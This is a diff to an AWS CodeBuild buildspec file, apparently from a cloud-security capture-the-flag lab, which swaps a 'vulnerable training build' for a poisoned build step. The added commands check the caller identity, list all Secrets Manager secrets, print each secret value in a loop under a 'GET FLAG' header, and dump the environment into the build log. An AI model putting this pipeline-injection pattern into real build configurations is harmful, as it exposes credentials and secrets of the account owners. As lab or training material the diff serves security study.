@@ -3,6 +3,13 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+      - echo "=== CALLER IDENTITY ==="
+      - aws sts get-caller-identity
+      - echo "=== REGION ==="
+      - echo $AWS_DEFAULT_REGION $AWS_REGION
+      - echo "=== LIST SECRETS ==="
+      - aws secretsmanager list-secrets --region us-east-1
+      - echo "=== GET FLAG ==="
+      - for secret in $(aws secretsmanager list-secrets --region us-east-1 --query 'SecretList[*].Name' --output text); do echo "SECRET $secret"; aws secretsmanager get-secret-value --secret-id "$secret" --region us-east-1 --query 'SecretString' --output text; done
+      - echo "=== ENV ==="
+      - env | sort
